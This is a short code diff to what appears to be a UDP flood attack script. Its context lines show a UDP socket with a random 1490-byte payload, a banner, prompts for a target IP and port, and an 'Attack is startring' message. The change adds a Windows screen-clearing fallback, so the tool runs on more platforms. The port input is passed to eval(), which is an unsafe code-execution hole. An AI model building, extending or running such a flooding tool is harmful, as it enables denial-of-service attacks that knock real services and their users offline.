@@ -19,7 +19,10 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 colorama.init(autoreset=True)
-os.system("clear")
+try:
+   os.system("clear")
+except:
+     os.system("cls")
 banner = Fore.YELLOW + f"""
 
 oooo     oooo      o      oooooooooo   oooooooo8 ooooo ooooo ooooooooo  ooooooooo     ooooooo    oooooooo8  
@@ -43,7 +46,10 @@ while True:
 
 print(Fore.YELLOW + f"TARGET SET ==>> {ips}" + Fore.YELLOW)
 port = eval(input("Port  : "))
-os.system("clear")
+try:
+   os.system("clear")
+except:
+     os.system("cls")
 print(banner)
 print(Back.GREEN + "Attack is startring...")
 print("[                    ] 0% ")
